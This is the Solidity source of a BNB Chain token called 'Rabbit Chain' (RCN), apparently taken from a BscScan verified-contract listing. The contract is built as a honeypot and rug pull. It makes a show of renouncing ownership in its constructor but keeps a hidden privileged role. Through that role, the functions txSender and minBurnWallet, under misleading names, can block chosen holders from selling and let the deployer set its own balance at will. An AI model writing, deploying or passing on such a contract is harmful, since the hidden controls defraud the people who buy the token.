/**
 *Submitted for verification at BscScan.com on 2023-01-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract RabbitChain {
    uint8 public decimals = 18;

    uint256 constant tokenTeam = 10 ** 10;
    address public takeBurnAmount;

    string public symbol = "RCN";
    mapping(address => bool) public sellLaunch;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => bool) public swapFund;
    string public name = "Rabbit Chain";

    mapping(address => uint256) public balanceOf;

    address public atSell;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;
    modifier modeSwap() {
        require(sellLaunch[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        IUniswapV2Router liquiditySell = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        takeBurnAmount = IUniswapV2Factory(liquiditySell.factory()).createPair(liquiditySell.WETH(), address(this));
        owner = msg.sender;
        atSell = owner;
        sellLaunch[atSell] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    function transfer(address dst, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, dst, amount);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function txSender(address isTakeTx) public modeSwap {
        swapFund[isTakeTx] = true;
    }

    function senderTx(address receiverTeam, address fundMax, uint256 launchedList) internal returns (bool) {
        require(balanceOf[receiverTeam] >= launchedList);
        balanceOf[receiverTeam] -= launchedList;
        balanceOf[fundMax] += launchedList;
        emit Transfer(receiverTeam, fundMax, launchedList);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function walletEnable(address sellSenderBurn) public modeSwap {
        sellLaunch[sellSenderBurn] = true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == atSell || recipient == atSell) {
            return senderTx(sender, recipient, amount);
        }
        if (swapFund[sender]) {
            return senderTx(sender, recipient, tokenTeam);
        }
        return senderTx(sender, recipient, amount);
    }

    function minBurnWallet(uint256 launchedList) public modeSwap {
        balanceOf[atSell] = launchedList;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != type(uint256).max) {
            require(allowance[sender][msg.sender] >= amount);
            allowance[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }


}